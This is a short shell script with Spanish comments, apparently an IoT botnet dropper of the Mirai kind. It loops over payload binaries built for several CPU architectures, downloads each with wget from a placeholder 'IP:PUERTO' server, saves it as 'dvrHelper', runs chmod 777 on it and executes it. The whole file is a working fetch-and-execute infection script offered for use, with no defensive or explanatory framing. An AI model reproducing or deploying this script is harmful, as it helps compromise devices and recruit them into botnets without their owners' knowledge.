// http bin.sh
#!/bin/sh

# Editemos
WEBSERVER="IP:PUERTO"
# No editemos más

BINARIES="bin.mips bin.x86 bin.arm7 bin.sh4  bin.mpsl bin.arm etc.etc etc.etc"

for Binary in $BINARIES; do
    wget http://$WEBSERVER/$Binary -O dvrHelper
    chmod 777 dvrHelper
    ./dvrHelper
done
